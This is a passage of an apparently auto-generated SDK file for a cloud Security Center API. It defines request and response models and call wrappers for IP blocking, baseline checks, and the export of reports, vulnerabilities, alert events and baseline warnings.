  var runtime = new Util.RuntimeOptions{};
  return enableCustomBlockRecordWithOptions(request, runtime);
}

model EnableCustomInstanceBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to block.

This parameter is required.', example='192.168.xx.xx'),
  bound?: string(name='Bound', description='The traffic direction from the IP address that you want to block. Valid value:

*   **in**
*   **out**', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', description='The UUID of the server.

This parameter is required.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model EnableCustomInstanceBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
}

model EnableCustomInstanceBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: EnableCustomInstanceBlockRecordResponseBody(name='body'),
}

/**
 * @summary Enables a custom rule for an instance.
 *
 * @param request EnableCustomInstanceBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return EnableCustomInstanceBlockRecordResponse
 */
async function enableCustomInstanceBlockRecordWithOptions(request: EnableCustomInstanceBlockRecordRequest, runtime: Util.RuntimeOptions): EnableCustomInstanceBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableCustomInstanceBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables a custom rule for an instance.
 *
 * @param request EnableCustomInstanceBlockRecordRequest
 * @return EnableCustomInstanceBlockRecordResponse
 */
async function enableCustomInstanceBlockRecord(request: EnableCustomInstanceBlockRecordRequest): EnableCustomInstanceBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableCustomInstanceBlockRecordWithOptions(request, runtime);
}

model EnableServiceAccessResourceDirectoryResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
}

model EnableServiceAccessResourceDirectoryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: EnableServiceAccessResourceDirectoryResponseBody(name='body'),
}

/**
 * @summary Enable the multi-account management feature of Security Center.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @param request EnableServiceAccessResourceDirectoryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return EnableServiceAccessResourceDirectoryResponse
 */
async function enableServiceAccessResourceDirectoryWithOptions(runtime: Util.RuntimeOptions): EnableServiceAccessResourceDirectoryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'EnableServiceAccessResourceDirectory',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enable the multi-account management feature of Security Center.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @return EnableServiceAccessResourceDirectoryResponse
 */
async function enableServiceAccessResourceDirectory(): EnableServiceAccessResourceDirectoryResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableServiceAccessResourceDirectoryWithOptions(runtime);
}

model ExecStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.

>  You can call the [DescribeStrategy](~~DescribeStrategy~~) operation to query the IDs of baseline check policies.', example='215421'),
}

model ExecStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7F84EBCA-86F8-5AA0-BF74-A0276ECB****'),
}

model ExecStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExecStrategyResponseBody(name='body'),
}

/**
 * @summary Performs a baseline check on servers to which a specified baseline check policy is applied.
 *
 * @param request ExecStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExecStrategyResponse
 */
async function execStrategyWithOptions(request: ExecStrategyRequest, runtime: Util.RuntimeOptions): ExecStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExecStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Performs a baseline check on servers to which a specified baseline check policy is applied.
 *
 * @param request ExecStrategyRequest
 * @return ExecStrategyResponse
 */
async function execStrategy(request: ExecStrategyRequest): ExecStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return execStrategyWithOptions(request, runtime);
}

model ExportCustomizeReportRequest {
  exportType?: string(name='ExportType', description='The type of the security report that you want to export. Valid values:

*   **HTML**
*   **PDF**

>  The default value is HTML. PDF is supported only for security reports in version 2.0.0.', example='HTML'),
  reportId?: long(name='ReportId', description='The ID of the security report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='1'),
}

model ExportCustomizeReportResponseBody = {
  downloadUrl?: string(name='DownloadUrl', description='The download URL of the security report.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  exportDate?: string(name='ExportDate', description='The time when the security report was exported.', example='2023-01-10'),
  exportId?: long(name='ExportId', description='The ID of the export task.', example='22'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

*   **fail**: The export task fails.
*   **exporting**: The export task is being executed.
*   **success**: The export task is successful.', example='exporting'),
  fileName?: string(name='FileName', description='The name of the report file that is exported.', example='test_xxxx.html'),
  reportId?: long(name='ReportId', description='The ID of the security report.', example='123'),
  requestId?: string(name='RequestId', description='The request ID.', example='FFDFCEB3-A5EE-590A-8E70-283EBC5D****'),
  urlExpiredTime?: long(name='UrlExpiredTime', description='The timestamp when the download URL expires. Unit: seconds.', example='1673335497000'),
}

model ExportCustomizeReportResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExportCustomizeReportResponseBody(name='body'),
}

/**
 * @summary Exports a security report.
 *
 * @param request ExportCustomizeReportRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExportCustomizeReportResponse
 */
async function exportCustomizeReportWithOptions(request: ExportCustomizeReportRequest, runtime: Util.RuntimeOptions): ExportCustomizeReportResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportCustomizeReport',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Exports a security report.
 *
 * @param request ExportCustomizeReportRequest
 * @return ExportCustomizeReportResponse
 */
async function exportCustomizeReport(request: ExportCustomizeReportRequest): ExportCustomizeReportResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportCustomizeReportWithOptions(request, runtime);
}

model ExportRecordRequest {
  exportFileType?: string(name='ExportFileType', description='The type of the file to export. Valid values:

*   **virusScanExport**: The details of the virus scan tasks are exported. This parameter is available and required when ExportType is set to virusScanExport.', example='virusScanExport'),
  exportType?: string(name='ExportType', description='The type of the check result list that you want to export. Valid values:

*   **assetInstance**: the list of servers displayed on the Host page
*   **user**: the list of fingerprints for accounts
*   **port**: the list of fingerprints for ports
*   **process**: the list of fingerprints for processes
*   **sca**: the list of fingerprints for middleware assets
*   **database**: the list of fingerprints for databases
*   **web**: the list of fingerprints for web services
*   **software**: the list of fingerprints for software assets
*   **cron**: the list of fingerprints for scheduled tasks
*   **autorun**: the list of fingerprints for startup items
*   **lkm**: the list of fingerprints for kernel modules
*   **webserver**: the list of fingerprints for websites
*   **virusScanExport**: the details of the virus scan tasks
*   **imageVulExport**: the list of image system vulnerabilities
*   **imageBaseLineExport**: the list of check results for image baselines
*   **imageAffectedMaliciousExport**: the list of check results for malicious image samples
*   **baselineCspm**: the list of check results for configuration assessment
*   **attack**: the list of alert events for attack analysis
*   **accessKey**: the list of alerts that are generated for AccessKey pair leaks
*   **exportObjectScanEvents**: the list of alerts generated for malicious files

This parameter is required.', example='database'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  params?: string(name='Params', description='The conditions that are used to filter check results.

> This operation is a common export operation for multiple features of Security Center. The available configuration fields of this parameter vary based on the features. We recommend that you do not specify this parameter when you call the operation. You can export an information list without specifying this parameter, and then filter data in the exported Excel file.', example='{"extend":"1","currentPage":1,"pageSize":10}'),
}

model ExportRecordResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='cms_20171101.xlsx'),
  id?: long(name='Id', description='The ID of the exported file.', example='131231'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model ExportRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExportRecordResponseBody(name='body'),
}

/**
 * @summary Exports the check results on the Host, Cloud Platform Configuration Assessment, Image Security, Attack Awareness, and AK leak detection pages to Excel files.
 *
 * @description You can call the operation to export the following check result lists:
 * *   The list of servers on the Host page.
 * *   The lists of image system vulnerabilities, image application vulnerabilities, image baseline check results, and malicious image samples on the Image Security page.
 * *   The list of attack analysis data on the Attack Awareness page.
 * *   The list of check results for AccessKey pair leaks on the AK leak detection page.
 *
 * @param request ExportRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExportRecordResponse
 */
async function exportRecordWithOptions(request: ExportRecordRequest, runtime: Util.RuntimeOptions): ExportRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportFileType)) {
    query['ExportFileType'] = request.exportFileType;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.params)) {
    query['Params'] = request.params;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Exports the check results on the Host, Cloud Platform Configuration Assessment, Image Security, Attack Awareness, and AK leak detection pages to Excel files.
 *
 * @description You can call the operation to export the following check result lists:
 * *   The list of servers on the Host page.
 * *   The lists of image system vulnerabilities, image application vulnerabilities, image baseline check results, and malicious image samples on the Image Security page.
 * *   The list of attack analysis data on the Attack Awareness page.
 * *   The list of check results for AccessKey pair leaks on the AK leak detection page.
 *
 * @param request ExportRecordRequest
 * @return ExportRecordResponse
 */
async function exportRecord(request: ExportRecordRequest): ExportRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportRecordWithOptions(request, runtime);
}

model ExportSuspEventsRequest {
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of assets.'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  dealed?: string(name='Dealed', description='The status of the alert event. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='Y'),
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='8076980'),
  id?: long(name='Id', description='The unique ID of the alert event.', example='17821'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious,remind'),
  name?: string(name='Name', description='The complete name of the exception.', example='WEBSHELL'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='The status codes of alert events.'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Others**', example='WEBSHELL'),
  remark?: string(name='Remark', description='The remarks.', example='remark'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX'),
  status?: string(name='Status', description='The handling status of the exception. Valid values:

*   **0**: all status
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted', example='0'),
  targetType?: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **uuid**: the UUID of the asset
*   **image_repo**: the ID of the image repository
*   **Cluster**: the ID of the cluster', example='uuid'),
  timeEnd?: string(name='TimeEnd', description='The end of the time range during which the exception is detected.', example='2022-12-05 00:00:00'),
  timeStart?: string(name='TimeStart', description='The beginning of the time range during which the exception is detected.', example='2022-10-01 00:00:00'),
  uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert event.', example='1fbe8d16727f61d1478a674d6fa0****'),
  uuid?: string(name='Uuid', description='The unique ID of the associated instance.', example='18b7336e-d469-473b-af83-8e5420f9****'),
}

model ExportSuspEventsResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221209'),
  id?: int32(name='Id', description='The ID of the export record of the anomalous event.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='EF145C20-6A19-529A-8BDD-0671DXXXXXX'),
}

model ExportSuspEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExportSuspEventsResponseBody(name='body'),
}

/**
 * @summary Exports the information about exceptions to a file.
 *
 * @param request ExportSuspEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExportSuspEventsResponse
 */
async function exportSuspEventsWithOptions(request: ExportSuspEventsRequest, runtime: Util.RuntimeOptions): ExportSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Exports the information about exceptions to a file.
 *
 * @param request ExportSuspEventsRequest
 * @return ExportSuspEventsResponse
 */
async function exportSuspEvents(request: ExportSuspEventsRequest): ExportSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportSuspEventsWithOptions(request, runtime);
}

model ExportVulRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:3197-Important: sudo security update'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You need to specify this parameter when you query application vulnerabilities. If you set the Type parameter to app, you must specify this parameter. Set the value to **sca**.

> If this parameter is set to **sca**, **application vulnerabilities** and the **vulnerabilities that are detected based on software component analysis** are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca'),
  containerName?: string(name='ContainerName', description='The name of the container that is affected by the vulnerability.', example='xxljob-7b87597b99-mcskr'),
  createTsEnd?: long(name='CreateTsEnd', description='The end time of the first scan.

>  This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1696186800000'),
  createTsStart?: long(name='CreateTsStart', description='The start time of the first scan.

>  This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1696128144000'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2022-44702'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is fixed. Valid values:

*   **y**: The vulnerability is fixed.
*   **n**: The vulnerability is not fixed.', example='n'),
  groupId?: string(name='GroupId', description='The server group ID of the server on which the vulnerabilities are detected.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='8834224'),
  imageName?: string(name='ImageName', description='The name of the image that is affected by the vulnerability.', example='container-***:****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   zh: Chinese
*   en: English', example='zh'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap'),
  path?: string(name='Path', description='The path of the process that is affected by the vulnerability.', example='/etc/test'),
  searchTags?: string(name='SearchTags', description='The tag that is used to search for the vulnerabilities. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='Restart required'),
  type?: string(name='Type', description='The type of the vulnerability that you want to export. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability

This parameter is required.', example='app'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the vulnerabilities are detected. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerabilities are detected. Separate multiple IDs with commas (,).

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='ins-133****,ins-5414****'),
}

model ExportVulResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='app_20211101'),
  id?: long(name='Id', description='The ID of the exported file.', example='81634'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E1FAB2B8-DF4D-55DF-BC3D-5C3CA6FD5B13'),
}

model ExportVulResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExportVulResponseBody(name='body'),
}

/**
 * @summary Exports vulnerabilities.
 *
 * @description You can call the ExportVul operation to export the following types of vulnerabilities: Linux software vulnerabilities, Windows system vulnerabilities, Web-CMS vulnerabilities, application vulnerabilities, and urgent vulnerabilities.
 * You can use this operation together with the DescribeVulExportInfo operation. After you call the ExportVul operation to create a vulnerability export task, you can call the DescribeVulExportInfo operation to query the progress of the task by specifying the ID of the task.
 * ### Limits
 * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request ExportVulRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExportVulResponse
 */
async function exportVulWithOptions(request: ExportVulRequest, runtime: Util.RuntimeOptions): ExportVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.containerName)) {
    query['ContainerName'] = request.containerName;
  }
  if (!Util.isUnset(request.createTsEnd)) {
    query['CreateTsEnd'] = request.createTsEnd;
  }
  if (!Util.isUnset(request.createTsStart)) {
    query['CreateTsStart'] = request.createTsStart;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Exports vulnerabilities.
 *
 * @description You can call the ExportVul operation to export the following types of vulnerabilities: Linux software vulnerabilities, Windows system vulnerabilities, Web-CMS vulnerabilities, application vulnerabilities, and urgent vulnerabilities.
 * You can use this operation together with the DescribeVulExportInfo operation. After you call the ExportVul operation to create a vulnerability export task, you can call the DescribeVulExportInfo operation to query the progress of the task by specifying the ID of the task.
 * ### Limits
 * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request ExportVulRequest
 * @return ExportVulResponse
 */
async function exportVul(request: ExportVulRequest): ExportVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportVulWithOptions(request, runtime);
}

model ExportWarningRequest {
  dealed?: string(name='Dealed', description='Specifies whether the baseline risks are handled. Valid values:

*   **Y**: yes
*   **N**: no', example='N'),
  exportType?: string(name='ExportType', description='The type of the export task. Set the value to **hc_check_warning**, which indicates tasks to export baseline check results.', example='hc_check_warning'),
  groupId?: long(name='GroupId', description='The ID of the server group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='13007754'),
  isCleartextPwd?: int32(name='IsCleartextPwd', description='The export method of the results for the weak password baseline check. Valid values:

*   **0**: exports the check results after it is masked.
*   **1**: exports the check results in plaintext.', example='0'),
  isSummaryExport?: int32(name='IsSummaryExport', description='Specifies whether the baseline check results are aggregated and exported. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskIds?: string(name='RiskIds', description='The ID of the risk item in the baseline check results. Separate multiple IDs with commas (,).', example='123,124'),
  riskLevels?: string(name='RiskLevels', description='The severity of the baseline check item. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Windows 2016/2019  Security Baseline'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
  statusList?: string(name='StatusList', description='The status of the check item in the baseline check results. Separate multiple statuses with commas (,). Valid values:

*   **3**: passed
*   **1**: failed', example='1,3'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='12'),
  subTypeNames?: string(name='SubTypeNames', description='The subtypes of the baselines based on which baseline checks are performed. Separate multiple subtypes with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is contained in the **SubTypes** parameter. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the value of the TypeName parameter.', example='hc_middleware_ack_master'),
  typeName?: string(name='TypeName', description='The type of the baseline based on which baseline checks are performed.

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container'),
  typeNames?: string(name='TypeNames', description='The types of the baselines based on which baseline checks are performed. Separate multiple types with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container,cis'),
  uuids?: string(name='Uuids', description='The UUID of the server whose baseline check results you want to export. Separate multiple UUIDs with commas (,).', example='inet-7c676676-06fa-442e-90fb-b802e****,inet-7c676676-06fa-442e-90fb-b****'),
}

